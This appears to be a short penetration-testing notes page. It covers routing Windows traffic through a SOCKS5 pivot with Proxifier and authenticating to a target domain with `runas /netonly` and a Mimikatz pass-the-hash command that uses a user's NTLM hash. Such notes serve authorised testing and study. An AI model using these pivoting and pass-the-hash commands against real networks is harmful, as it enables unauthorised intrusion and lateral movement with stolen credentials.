# Proxifier (Windows)



## Introduction

We can tunnel traffic from our Windows machine using proxifier.

{% embed url="https://www.proxifier.com/" %}



## Configuration

It's import to enable the correct target hosts when setting up our proxy rules.

Click **Add** to create a new rule and use the following:

* Name:  Tools
* Applications:  Any
* Target hosts:  10.10.120.0/24;10.10.122.0/23
* Target ports:  Any
* Action:  Proxy SOCKS5 10.10.5.50



## Authenticating over Proxy

An application needs to be launched as a user from the target domain.  This can be achieved using `runas /netonly` or Mimikatz.

#### runas

```powershell
PS C:\Users\scrub> runas /netonly /user:ROTTA\cfoxy mmc.exe
```

MMC.exe is the executable file for Microsoft Management Console (MMC), a tool that allows users to configure and monitor their Microsoft Windows system

**Mimikatz:**

```sh
mimikatz # privilege::debug
mimikatz # sekurlsa::pth /domain:ROTTA /user:cfoxy /ntlm:<cfoxy-hash> /run:mmc.exe
```
